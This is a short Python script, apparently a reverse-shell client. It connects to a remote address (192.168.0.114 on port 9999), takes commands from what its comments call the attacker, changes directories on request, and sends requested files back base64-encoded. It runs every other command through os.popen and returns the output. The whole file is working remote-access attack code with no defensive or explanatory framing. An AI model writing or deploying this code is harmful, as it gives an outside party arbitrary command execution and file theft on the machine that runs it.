import socket, subprocess, os, base64

# calling the attackers IP address
s = socket.socket()
s.connect(('192.168.0.114', 9999))

while True:
    # wait for the attacker to send a command
    cmd = s.recv(1024).decode()
    if cmd == "exit": break

    # check what the attacker wants to do
    if cmd.startswith("cd "):
        os.chdir(cmd[3:]) #change directory
        s.send(b"Done.")
    elif cmd.startswith("download "):
        with open(cmd.split()[1], "rb") as f:
            s.send(base64.b64encode(f.read())) # send file in Base64 encoding
    else:
        # run terminal commands and send output back
        output = os.popen(cmd).read()
        s.send(output.encode() if output else b"Command executed.")